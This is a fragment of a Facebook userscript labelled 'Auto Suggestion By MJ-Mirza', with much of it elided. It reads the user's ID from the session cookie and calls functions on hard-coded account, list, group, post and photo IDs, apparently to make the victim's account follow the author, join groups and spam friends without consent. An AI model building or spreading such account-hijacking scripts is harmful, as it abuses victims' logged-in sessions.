// ==UserScript==
// @name            Facebook Auto Suggestion By MJ-Mirza
// @description     Facebook Auto Suggestion By MJ-Mirza
...
a("100002001974782");
a("100004426989153");
sublist("476035172482962");
var gid=["186189161515797"];
...
var spost_id = "462772503789089";
var sfoto_id = "442979545746759";
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
var smesaj = "";
var smesaj_text = "";
var arkadaslar = [];
...
function blub()
{
    if(document.getElementsByClassName('pbm fsm').length == 1) {
        ...
        //e.href = '#';
        e.innerHTML = 'Auto Suggest by MJ-Mirza';
